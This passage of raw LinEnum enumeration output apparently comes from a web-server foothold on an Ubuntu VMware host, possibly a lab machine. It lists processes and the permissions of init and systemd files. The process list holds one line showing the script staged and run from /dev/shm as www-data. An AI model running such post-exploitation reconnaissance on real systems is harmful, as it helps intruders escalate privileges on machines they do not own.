[rcu_bh] root 9 0.0 0.0 0 0 ? S 10:15 0:00 [migration/0] root 10 0.0 0.0 0 0 ? S 10:15 0:00 [watchdog/0] root 11 0.0 0.0 0 0 ? S 10:15 0:00 [kdevtmpfs] root 12 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [netns] root 13 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [perf] root 14 0.0 0.0 0 0 ? S 10:15 0:00 [khungtaskd] root 15 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [writeback] root 16 0.0 0.0 0 0 ? SN 10:15 0:00 [ksmd] root 17 0.0 0.0 0 0 ? SN 10:15 0:00 [khugepaged] root 18 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [crypto] root 19 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [kintegrityd] root 20 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 21 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [kblockd] root 22 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [ata_sff] root 23 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [md] root 24 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [devfreq_wq] root 26 0.0 0.0 0 0 ? S 10:15 0:00 [kworker/0:1] root 28 0.0 0.0 0 0 ? S 10:15 0:00 [kswapd0] root 29 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [vmstat] root 30 0.0 0.0 0 0 ? S 10:15 0:00 [fsnotify_mark] root 31 0.0 0.0 0 0 ? S 10:15 0:00 [ecryptfs-kthrea] root 47 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [kthrotld] root 48 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [acpi_thermal_pm] root 49 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 50 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 51 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 52 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 53 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 54 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 55 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 56 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 57 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 58 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 59 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 60 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 61 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 62 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 63 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 64 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 65 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 66 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 67 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 68 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 69 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 70 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 71 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 72 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 73 0.0 0.0 0 0 ? S 10:15 0:00 [scsi_eh_0] root 74 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [scsi_tmf_0] root 75 0.0 0.0 0 0 ? S 10:15 0:00 [scsi_eh_1] root 76 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [scsi_tmf_1] root 77 0.0 0.0 0 0 ? S 10:15 0:00 [kworker/u256:2] root 83 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [ipv6_addrconf] root 97 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 98 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [deferwq] root 99 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [charger_manager] root 100 0.0 0.0 0 0 ? S 10:15 0:00 [kworker/u256:4] root 157 0.0 0.0 0 0 ? S 10:15 0:00 [scsi_eh_2] root 158 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [scsi_tmf_2] root 159 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [vmw_pvscsi_wq_2] root 160 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 173 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [kpsmoused] root 178 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [ttm_swap] root 201 0.0 0.0 0 0 ? S 10:15 0:00 [jbd2/sda1-8] root 202 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [ext4-rsv-conver] root 237 0.0 0.2 28332 2852 ? Ss 10:15 0:00 /lib/systemd/systemd-journald root 243 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [kworker/0:1H] root 255 0.0 0.0 0 0 ? S 10:15 0:00 [kauditd] root 275 0.0 0.2 93088 2356 ? Ssl 10:15 0:00 vmware-vmblock-fuse /run/vmblock-fuse -o rw,subtype=vmware-vmblock,default_permissions,allow_other,dev,suid root 298 0.0 0.3 44416 3864 ? Ss 10:15 0:00 /lib/systemd/systemd-udevd systemd+ 422 0.0 0.2 100324 2536 ? Ssl 10:15 0:00 /lib/systemd/systemd-timesyncd message+ 556 0.0 0.3 42900 3968 ? Ss 10:15 0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation root 569 0.0 0.2 29008 2964 ? Ss 10:15 0:00 /usr/sbin/cron -f root 570 0.0 0.1 20100 1128 ? Ss 10:15 0:00 /lib/systemd/systemd-logind root 573 0.0 0.6 275760 6232 ? Ssl 10:15 0:00 /usr/lib/accountsservice/accounts-daemon syslog 574 0.0 0.3 256396 3360 ? Ssl 10:15 0:00 /usr/sbin/rsyslogd -n root 591 0.0 0.9 111868 9648 ? Ss 10:15 0:04 /usr/bin/vmtoolsd root 643 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [edac-poller] root 664 0.0 0.1 15940 1776 tty1 Ss+ 10:15 0:00 /sbin/agetty --noclear tty1 linux root 771 0.0 2.4 255896 24876 ? Ss 10:15 0:00 /usr/sbin/apache2 -k start www-data 775 0.0 1.0 256220 10944 ? S 10:15 0:01 /usr/sbin/apache2 -k start www-data 776 0.0 1.0 256236 10676 ? S 10:15 0:01 /usr/sbin/apache2 -k start www-data 777 0.0 1.2 256380 12512 ? S 10:15 0:01 /usr/sbin/apache2 -k start www-data 778 0.0 1.2 256380 12036 ? S 10:15 0:01 /usr/sbin/apache2 -k start www-data 813 0.0 1.1 256212 11836 ? S 10:23 0:01 /usr/sbin/apache2 -k start www-data 816 0.0 0.7 255976 7780 ? S 10:23 0:01 /usr/sbin/apache2 -k start www-data 817 0.0 0.9 256148 9080 ? S 10:23 0:01 /usr/sbin/apache2 -k start www-data 819 0.0 1.1 256204 11684 ? S 10:23 0:01 /usr/sbin/apache2 -k start root 844 0.0 0.0 0 0 ? S 10:30 0:02 [kworker/0:0] www-data 1085 0.1 1.1 256372 11904 ? S 11:21 0:01 /usr/sbin/apache2 -k start www-data 1089 0.1 0.7 255976 7780 ? S 11:21 0:01 /usr/sbin/apache2 -k start www-data 1211 0.0 0.0 4508 704 ? S 11:39 0:00 sh -c cd /dev/shm; bash LinEnum.sh 2\u0026gt;\u0026amp;1 www-data 1212 0.0 0.3 19028 3848 ? S 11:39 0:00 bash LinEnum.sh www-data 1213 0.0 0.3 19072 3620 ? S 11:39 0:00 bash LinEnum.sh www-data 1214 0.0 0.0 4384 688 ? S 11:39 0:00 tee -a www-data 1421 0.0 0.3 19056 3012 ? S 11:39 0:00 bash LinEnum.sh www-data 1422 0.0 0.2 34424 2788 ? R 11:39 0:00 ps aux [00;31m[-] Process binaries and associated permissions (from above list):[00m -rwxr-xr-x 1 root root 326224 Jan 18 2017 /lib/systemd/systemd-journald -rwxr-xr-x 1 root root 618520 Jan 18 2017 /lib/systemd/systemd-logind -rwxr-xr-x 1 root root 141904 Jan 18 2017 /lib/systemd/systemd-timesyncd -rwxr-xr-x 1 root root 453240 Jan 18 2017 /lib/systemd/systemd-udevd -rwxr-xr-x 1 root root 44104 Dec 16 2016 /sbin/agetty lrwxrwxrwx 1 root root 20 Dec 4 2017 /sbin/init -\u0026gt; /lib/systemd/systemd -rwxr-xr-x 1 root root 224208 Jan 12 2017 /usr/bin/dbus-daemon -rwxr-xr-x 1 root root 44528 Feb 9 2017 /usr/bin/vmtoolsd -rwxr-xr-x 1 root root 164928 Nov 3 2016 /usr/lib/accountsservice/accounts-daemon -rwxr-xr-x 1 root root 662496 Sep 18 2017 /usr/sbin/apache2 -rwxr-xr-x 1 root root 44472 Apr 5 2016 /usr/sbin/cron -rwxr-xr-x 1 root root 599328 Apr 5 2016 /usr/sbin/rsyslogd [00;31m[-] /etc/init.d/ binary permissions:[00m total 252 drwxr-xr-x 2 root root 4096 Dec 4 2017 . drwxr-xr-x 89 root root 4096 Dec 4 2017 .. -rw-r--r-- 1 root root 1355 Dec 4 2017 .depend.boot -rw-r--r-- 1 root root 471 Dec 4 2017 .depend.start -rw-r--r-- 1 root root 667 Dec 4 2017 .depend.stop -rw-r--r-- 1 root root 2427 Jan 19 2016 README -rwxr-xr-x 1 root root 2210 Apr 5 2016 apache-htcacheclean -rwxr-xr-x 1 root root 8087 Apr 5 2016 apache2 -rwxr-xr-x 1 root root 6250 Oct 4 2016 apparmor -rwxr-xr-x 1 root root 1275 Jan 19 2016 bootmisc.sh -rwxr-xr-x 1 root root 3807 Jan 19 2016 checkfs.sh -rwxr-xr-x 1 root root 1098 Jan 19 2016 checkroot-bootclean.sh -rwxr-xr-x 1 root root 9353 Jan 19 2016 checkroot.sh -rwxr-xr-x 1 root root 1343 Apr 4 2016 console-setup -rwxr-xr-x 1 root root 3049 Apr 5 2016 cron -rwxr-xr-x 1 root root 2813 Dec 1 2015 dbus -rwxr-xr-x 1 root root 1105 Mar 15 2016 grub-common -rwxr-xr-x 1 root root 1336 Jan 19 2016 halt -rwxr-xr-x 1 root root 1423 Jan 19 2016 hostname.sh -rwxr-xr-x 1 root root 3809 Mar 12 2016 hwclock.sh -rwxr-xr-x 1 root root 2372 Apr 11 2016 irqbalance -rwxr-xr-x 1 root root 1804 Apr 4 2016 keyboard-setup -rwxr-xr-x 1 root root 1300 Jan 19 2016 killprocs -rwxr-xr-x 1 root root 2087 Dec 20 2015 kmod -rwxr-xr-x 1 root root 703 Jan 19 2016 mountall-bootclean.sh -rwxr-xr-x 1 root root 2301 Jan 19 2016 mountall.sh -rwxr-xr-x 1 root root 1461 Jan 19 2016 mountdevsubfs.sh -rwxr-xr-x 1 root root 1564 Jan 19 2016 mountkernfs.sh -rwxr-xr-x 1 root root 711 Jan 19 2016 mountnfs-bootclean.sh -rwxr-xr-x 1 root root 2456 Jan 19 2016 mountnfs.sh -rwxr-xr-x 1 root root 4771 Jul 19 2015 networking -rwxr-xr-x 1 root root 1581 Oct 15 2015 ondemand -rwxr-xr-x 1 root root 1578 Sep 17 2016 open-vm-tools -rwxr-xr-x 1 root root 1366 Nov 15 2015 plymouth -rwxr-xr-x 1 root root 752 Nov 15 2015 plymouth-log -rwxr-xr-x 1 root root 1192 Sep 5 2015 procps -rwxr-xr-x 1 root root 6366 Jan 19 2016 rc -rwxr-xr-x 1 root root 820 Jan 19 2016 rc.local -rwxr-xr-x 1 root root 117 Jan 19 2016 rcS -rwxr-xr-x 1 root root 661 Jan 19 2016 reboot -rwxr-xr-x 1 root root 4149 Nov 23 2015 resolvconf -rwxr-xr-x 1 root root 4355 Jul 10 2014 rsync -rwxr-xr-x 1 root root 2796 Feb 3 2016 rsyslog -rwxr-xr-x 1 root root 3927 Jan 19 2016 sendsigs -rwxr-xr-x 1 root root 597 Jan 19 2016 single -rw-r--r-- 1 root root 1087 Jan 19 2016 skeleton -rwxr-xr-x 1 root root 6087 Apr 12 2016 udev -rwxr-xr-x 1 root root 2049 Aug 7 2014 ufw -rwxr-xr-x 1 root root 2737 Jan 19 2016 umountfs -rwxr-xr-x 1 root root 2202 Jan 19 2016 umountnfs.sh -rwxr-xr-x 1 root root 1879 Jan 19 2016 umountroot -rwxr-xr-x 1 root root 3111 Jan 19 2016 urandom -rwxr-xr-x 1 root root 1306 Dec 16 2016 uuidd -rwxr-xr-x 1 root root 2757 Nov 10 2015 x11-common [00;31m[-] /etc/init/ config file permissions:[00m total 124 drwxr-xr-x 2 root root 4096 Dec 4 2017 . drwxr-xr-x 89 root root 4096 Dec 4 2017 .. -rw-r--r-- 1 root root 3735 Oct 4 2016 apparmor.conf -rw-r--r-- 1 root root 250 Apr 4 2016 console-font.conf -rw-r--r-- 1 root root 509 Apr 4 2016 console-setup.conf -rw-r--r-- 1 root root 297 Apr 5 2016 cron.conf -rw-r--r-- 1 root root 482 Sep 1 2015 dbus.conf -rw-r--r-- 1 root root 1247 Jun 1 2015 friendly-recovery.conf -rw-r--r-- 1 root root 284 Jul 23 2013 hostname.conf -rw-r--r-- 1 root root 300 May 21 2014 hostname.sh.conf -rw-r--r-- 1 root root 561 Mar 14 2016 hwclock-save.conf -rw-r--r-- 1 root root 674 Mar 14 2016 hwclock.conf -rw-r--r-- 1 root root 109 Mar 14 2016 hwclock.sh.conf -rw-r--r-- 1 root root 597 Apr 11 2016 irqbalance.conf -rw-r--r-- 1 root root 689 Aug 20 2015 kmod.conf -rw-r--r-- 1 root root 530 Jun 2 2015 network-interface-container.conf -rw-r--r-- 1 root root 1756 Jun 2 2015 network-interface-security.conf -rw-r--r-- 1 root root 933 Jun 2 2015 network-interface.conf -rw-r--r-- 1 root root 2493 Jun 2 2015 networking.conf -rw-r--r-- 1 root root 568 Feb 1 2016 passwd.conf -rw-r--r-- 1 root root 363 Jun 5 2014 procps-instance.conf -rw-r--r-- 1 root root 119 Jun 5 2014 procps.conf -rw-r--r-- 1 root root 457 Jun 3 2015 resolvconf.conf -rw-r--r-- 1 root root 426 Dec 2 2015 rsyslog.conf -rw-r--r-- 1 root root 230 Apr 4 2016 setvtrgb.conf -rw-r--r-- 1 root root 337 Apr 12 2016 udev.conf -rw-r--r-- 1 root root 360 Apr 12 2016 udevmonitor.conf -rw-r--r-- 1 root root 352 Apr 12 2016 udevtrigger.conf -rw-r--r-- 1 root root 473 Aug 7 2014 ufw.conf -rw-r--r-- 1 root root 683 Feb 24 2015 ureadahead-other.conf -rw-r--r-- 1 root root 889 Feb 24 2015 ureadahead.conf [00;31m[-] /lib/systemd/* config file permissions:[00m /lib/systemd/: total 8.2M drwxr-xr-x 26 root root 12K Dec 4 2017 system drwxr-xr-x 2 root root 4.0K Dec 4 2017 system-sleep drwxr-xr-x 2 root root 4.0K Dec 4 2017 system-preset drwxr-xr-x 2 root root 4.0K Dec 4 2017 system-generators drwxr-xr-x 2 root root 4.0K Dec 4 2017 network -rwxr-xr-x 1 root root 443K Jan 18 2017 systemd-udevd -rwxr-xr-x 1 root root 15K Jan 18 2017 systemd-ac-power -rwxr-xr-x 1 root root 47K Jan 18 2017 systemd-binfmt -rwxr-xr-x 1 root root 103K Jan 18 2017 systemd-bootchart -rwxr-xr-x 1 root root 91K Jan 18 2017 systemd-cryptsetup -rwxr-xr-x 1 root root 75K Jan 18 2017 systemd-fsckd -rwxr-xr-x 1 root root 276K Jan 18 2017 systemd-initctl -rwxr-xr-x 1 root root 824K Jan 18 2017 systemd-networkd -rwxr-xr-x 1 root root 35K Jan 18 2017 systemd-quotacheck -rwxr-xr-x 1 root root 657K Jan 18 2017 systemd-resolved -rwxr-xr-x 1 root root 35K Jan 18 2017 systemd-user-sessions -rwxr-xr-x 1 root root 55K Jan 18 2017 systemd-activate -rwxr-xr-x 1 root root 91K Jan 18 2017 systemd-backlight -rwxr-xr-x 1 root root 352K Jan 18 2017 systemd-bus-proxyd -rwxr-xr-x 1 root root 31K Jan 18 2017 systemd-hibernate-resume -rwxr-xr-x 1 root root 340K Jan 18 2017 systemd-localed -rwxr-xr-x 1 root root 605K Jan 18 2017 systemd-logind -rwxr-xr-x 1 root root 123K Jan 18 2017 systemd-networkd-wait-online -rwxr-xr-x 1 root root 35K Jan 18 2017 systemd-random-seed -rwxr-xr-x 1 root root 31K Jan 18 2017 systemd-reply-password -rwxr-xr-x 1 root root 91K Jan 18 2017 systemd-rfkill -rwxr-xr-x 1 root root 143K Jan 18 2017 systemd-shutdown -rwxr-xr-x 1 root root 71K Jan 18 2017 systemd-sleep -rwxr-xr-x 1 root root 51K Jan 18 2017 systemd-sysctl -rwxr-xr-x 1 root root 333K Jan 18 2017 systemd-timedated -rwxr-xr-x 1 root root 139K Jan 18 2017 systemd-timesyncd -rwxr-xr-x 1 root root 276K Jan 18 2017 systemd-update-utmp -rwxr-xr-x 1 root root 1.6M Jan 18 2017 systemd -rwxr-xr-x 1 root root 268K Jan 18 2017 systemd-cgroups-agent -rwxr-xr-x 1 root root 301K Jan 18 2017 systemd-fsck -rwxr-xr-x 1 root root 332K Jan 18 2017 systemd-hostnamed -rwxr-xr-x 1 root root 319K Jan 18 2017 systemd-journald -rwxr-xr-x 1 root root 51K Jan 18 2017 systemd-modules-load -rwxr-xr-x 1 root root 51K Jan 18 2017 systemd-remount-fs -rwxr-xr-x 1 root root 91K Jan 18 2017 systemd-socket-proxyd -rwxr-xr-x 1 root root 1.3K Jan 12 2017 systemd-sysv-install drwxr-xr-x 2 root root 4.0K Apr 12 2016 system-shutdown /lib/systemd/system: total 792K drwxr-xr-x 2 root root 4.0K Dec 4 2017 apache2.service.d drwxr-xr-x 2 root root 4.0K Dec 4 2017 halt.target.wants drwxr-xr-x 2 root root 4.0K Dec 4 2017 initrd-switch-root.target.wants drwxr-xr-x 2 root root 4.0K Dec 4 2017 kexec.target.wants drwxr-xr-x 2 root root 4.0K Dec 4 2017 multi-user.target.wants drwxr-xr-x 2 root root 4.0K Dec 4 2017 poweroff.target.wants drwxr-xr-x 2 root root 4.0K Dec 4 2017 reboot.target.wants drwxr-xr-x 2 root root 4.0K Dec 4 2017 sysinit.target.wants drwxr-xr-x 2 root root 4.0K Dec 4 2017 sockets.target.wants drwxr-xr-x 2 root root 4.0K Dec 4 2017 timers.target.wants lrwxrwxrwx 1 root root 21 Dec 4 2017 udev.service -\u0026gt; systemd-udevd.service lrwxrwxrwx 1 root root 9 Dec 4 2017 umountfs.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 umountnfs.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 umountroot.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 27 Dec 4 2017 urandom.service -\u0026gt; systemd-random-seed.service lrwxrwxrwx 1 root root 9 Dec 4 2017 x11-common.service -\u0026gt; /dev/null drwxr-xr-x 2 root root 4.0K Dec 4 2017 systemd-timesyncd.service.d lrwxrwxrwx 1 root root 9 Dec 4 2017 sendsigs.service -\u0026gt; /dev/null drwxr-xr-x 2 root root 4.0K Dec 4 2017 sigpwr.target.wants lrwxrwxrwx 1 root root 9 Dec 4 2017 single.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 stop-bootlogd-single.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 stop-bootlogd.service -\u0026gt; /dev/null drwxr-xr-x 2 root root 4.0K Dec 4 2017 rescue.target.wants drwxr-xr-x 2 root root 4.0K Dec 4 2017 resolvconf.service.wants lrwxrwxrwx 1 root root 9 Dec 4 2017 rmnologin.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 15 Dec 4 2017 runlevel0.target -\u0026gt; poweroff.target lrwxrwxrwx 1 root root 13 Dec 4 2017 runlevel1.target -\u0026gt; rescue.target lrwxrwxrwx 1 root root 17 Dec 4 2017 runlevel2.target -\u0026gt; multi-user.target lrwxrwxrwx 1 root root 17 Dec 4 2017 runlevel3.target -\u0026gt; multi-user.target lrwxrwxrwx 1 root root 17 Dec 4 2017 runlevel4.target -\u0026gt; multi-user.target lrwxrwxrwx 1 root root 16 Dec 4 2017 runlevel5.target -\u0026gt; graphical.target lrwxrwxrwx 1 root root 13 Dec 4 2017 runlevel6.target -\u0026gt; reboot.target lrwxrwxrwx 1 root root 22 Dec 4 2017 procps.service -\u0026gt; systemd-sysctl.service drwxr-xr-x 2 root root 4.0K Dec 4 2017 rc-local.service.d lrwxrwxrwx 1 root root 16 Dec 4 2017 rc.local.service -\u0026gt; rc-local.service lrwxrwxrwx 1 root root 9 Dec 4 2017 rc.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 rcS.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 reboot.service -\u0026gt; /dev/null drwxr-xr-x 2 root root 4.0K Dec 4 2017 graphical.target.wants lrwxrwxrwx 1 root root 9 Dec 4 2017 halt.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 hostname.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 hwclock.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 killprocs.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 28 Dec 4 2017 kmod.service -\u0026gt; systemd-modules-load.service drwxr-xr-x 2 root root 4.0K Dec 4 2017 local-fs.target.wants lrwxrwxrwx 1 root root 28 Dec 4 2017 module-init-tools.service -\u0026gt; systemd-modules-load.service lrwxrwxrwx 1 root root 9 Dec 4 2017 motd.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 mountall-bootclean.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 mountall.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 mountdevsubfs.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 mountkernfs.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 mountnfs-bootclean.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 mountnfs.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 16 Dec 4 2017 default.target -\u0026gt; graphical.target lrwxrwxrwx 1 root root 9 Dec 4 2017 fuse.service -\u0026gt; /dev/null drwxr-xr-x 2 root root 4.0K Dec 4 2017 getty.target.wants lrwxrwxrwx 1 root root 14 Dec 4 2017 autovt@.service -\u0026gt; getty@.service lrwxrwxrwx 1 root root 9 Dec 4 2017 bootlogd.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 bootlogs.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 bootmisc.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 checkfs.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 checkroot-bootclean.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 checkroot.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 cryptdisks-early.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 cryptdisks.service -\u0026gt; /dev/null lrwxrwxrwx 1 root root 13 Dec 4 2017 ctrl-alt-del.target -\u0026gt; reboot.target lrwxrwxrwx 1 root root 25 Dec 4 2017 dbus-org.freedesktop.hostname1.service -\u0026gt; systemd-hostnamed.service lrwxrwxrwx 1 root root 23 Dec 4 2017 dbus-org.freedesktop.locale1.service -\u0026gt; systemd-localed.service lrwxrwxrwx 1 root root 22 Dec 4 2017 dbus-org.freedesktop.login1.service -\u0026gt; systemd-logind.service lrwxrwxrwx 1 root root 24 Dec 4 2017 dbus-org.freedesktop.network1.service -\u0026gt; systemd-networkd.service lrwxrwxrwx 1 root root 24 Dec 4 2017 dbus-org.freedesktop.resolve1.service -\u0026gt; systemd-resolved.service lrwxrwxrwx 1 root root 25 Dec 4 2017 dbus-org.freedesktop.timedate1.service -\u0026gt; systemd-timedated.service drwxr-xr-x 2 root root 4.0K Feb 15 2017 busnames.target.wants -rw-r--r-- 1 root root 460 Feb 9 2017 run-vmblock-fuse.mount -rw-r--r-- 1 root root 269 Jan 31 2017 setvtrgb.service -rw-r--r-- 1 root root 770 Jan 18 2017 console-getty.service -rw-r--r-- 1 root root 742 Jan 18 2017 console-shell.service -rw-r--r-- 1 root root 791 Jan 18 2017 container-getty@.service -rw-r--r-- 1 root root 1010 Jan 18 2017 debug-shell.service -rw-r--r-- 1 root root 1009 Jan 18 2017 emergency.service -rw-r--r-- 1 root root 1.5K Jan 18 2017 getty@.service -rw-r--r-- 1 root root 630 Jan 18 2017 initrd-cleanup.service -rw-r--r-- 1 root root 790 Jan 18 2017 initrd-parse-etc.service -rw-r--r-- 1 root root 640 Jan 18 2017 initrd-switch-root.service -rw-r--r-- 1 root root 664 Jan 18 2017 initrd-udevadm-cleanup-db.service -rw-r--r-- 1 root root 677 Jan 18 2017 kmod-static-nodes.service -rw-r--r-- 1 root root 473 Jan 18 2017 mail-transport-agent.target -rw-r--r-- 1 root root 568 Jan 18 2017 quotaon.service -rw-r--r-- 1 root root 612 Jan 18 2017 rc-local.service -rw-r--r-- 1 root root 978 Jan 18 2017 rescue.service -rw-r--r-- 1 root root 1.1K Jan 18 2017 serial-getty@.service -rw-r--r-- 1 root root 653 Jan 18 2017 systemd-ask-password-console.service -rw-r--r-- 1 root root 681 Jan 18 2017 systemd-ask-password-wall.service -rw-r--r-- 1 root root 724 Jan 18 2017 systemd-backlight@.service -rw-r--r-- 1 root root 959 Jan 18 2017 systemd-binfmt.service -rw-r--r-- 1 root root 650 Jan 18 2017 systemd-bootchart.service -rw-r--r-- 1 root root 1.0K Jan 18 2017 systemd-bus-proxyd.service -rw-r--r-- 1 root root 497 Jan 18 2017 systemd-exit.service -rw-r--r-- 1 root root 674 Jan 18 2017 systemd-fsck-root.service -rw-r--r-- 1 root root 648 Jan 18 2017 systemd-fsck@.service -rw-r--r-- 1 root root 551 Jan 18 2017 systemd-fsckd.service -rw-r--r-- 1 root root 544 Jan 18 2017 systemd-halt.service -rw-r--r-- 1 root root 631 Jan 18 2017 systemd-hibernate-resume@.service -rw-r--r-- 1 root root 501 Jan 18 2017 systemd-hibernate.service -rw-r--r-- 1 root root 710 Jan 18 2017 systemd-hostnamed.service -rw-r--r-- 1 root root 778 Jan 18 2017 systemd-hwdb-update.service -rw-r--r-- 1 root root 519 Jan 18 2017 systemd-hybrid-sleep.service -rw-r--r-- 1 root root 480 Jan 18 2017 systemd-initctl.service -rw-r--r-- 1 root root 731 Jan 18 2017 systemd-journal-flush.service -rw-r--r-- 1 root root 1.3K Jan 18 2017 systemd-journald.service -rw-r--r-- 1 root root 557 Jan 18 2017 systemd-kexec.service -rw-r--r-- 1 root root 691 Jan 18 2017 systemd-localed.service -rw-r--r-- 1 root root 1.2K Jan 18 2017 systemd-logind.service -rw-r--r-- 1 root root 693 Jan 18 2017 systemd-machine-id-commit.service -rw-r--r-- 1 root root 967 Jan 18 2017 systemd-modules-load.service -rw-r--r-- 1 root root 685 Jan 18 2017 systemd-networkd-wait-online.service -rw-r--r-- 1 root root 1.3K Jan 18 2017 systemd-networkd.service -rw-r--r-- 1 root root 553 Jan 18 2017 systemd-poweroff.service -rw-r--r-- 1 root root 614 Jan 18 2017 systemd-quotacheck.service -rw-r--r-- 1 root root 717 Jan 18 2017 systemd-random-seed.service -rw-r--r-- 1 root root 548 Jan 18 2017 systemd-reboot.service -rw-r--r-- 1 root root 757 Jan 18 2017 systemd-remount-fs.service -rw-r--r-- 1 root root 907 Jan 18 2017 systemd-resolved.service -rw-r--r-- 1 root root 696 Jan 18 2017 systemd-rfkill.service -rw-r--r-- 1 root root 497 Jan 18 2017 systemd-suspend.service -rw-r--r-- 1 root root 649 Jan 18 2017 systemd-sysctl.service -rw-r--r-- 1 root root 655 Jan 18 2017 systemd-timedated.service -rw-r--r-- 1 root root 1.1K Jan 18 2017 systemd-timesyncd.service -rw-r--r-- 1 root root 598 Jan 18 2017 systemd-tmpfiles-clean.service -rw-r--r-- 1 root root 703 Jan 18 2017 systemd-tmpfiles-setup-dev.service -rw-r--r-- 1 root root 683 Jan 18 2017 systemd-tmpfiles-setup.service -rw-r--r-- 1 root root 823 Jan 18 2017 systemd-udev-settle.service -rw-r--r-- 1 root root 743 Jan 18 2017 systemd-udev-trigger.service -rw-r--r-- 1 root root 825 Jan 18 2017 systemd-udevd.service -rw-r--r-- 1 root root 757 Jan 18 2017 systemd-update-utmp-runlevel.service -rw-r--r-- 1 root root 754 Jan 18 2017 systemd-update-utmp.service -rw-r--r-- 1 root root 573 Jan 18 2017 systemd-user-sessions.service -rw-r--r-- 1 root root 528 Jan 18 2017 user@.service -rw-r--r-- 1 root root 403 Jan 18 2017 -.slice -rw-r--r-- 1 root root 879 Jan 18 2017 basic.target -rw-r--r-- 1 root root 379 Jan 18 2017 bluetooth.target -rw-r--r-- 1 root root 358 Jan 18 2017 busnames.target -rw-r--r-- 1 root root 394 Jan 18 2017 cryptsetup-pre.target -rw-r--r-- 1 root root 366 Jan 18 2017 cryptsetup.target -rw-r--r-- 1 root root 